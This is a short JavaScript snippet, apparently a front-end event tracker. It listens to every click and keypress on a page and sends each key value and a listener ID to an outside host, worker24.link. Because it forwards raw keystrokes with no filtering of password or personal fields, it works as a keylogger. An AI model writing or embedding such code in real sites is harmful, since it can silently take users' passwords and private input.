function sendEvent(data) {
  const listenerId = document.body.getAttribute('data-listener-id');

  const payload = {
    ListenerId: listenerId,
    ...data
  };

  fetch('https://worker24.link/frontend_events_listener', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  }).catch(err => console.error('Failed to send event:', err));
}

document.addEventListener('click', function(event) {
  sendEvent({ type: 'click', target: event.target.tagName, timestamp: Date.now() });
});

document.addEventListener('keydown', function(event) {
  sendEvent({ type: 'keydown', key: event.key, timestamp: Date.now() });
});

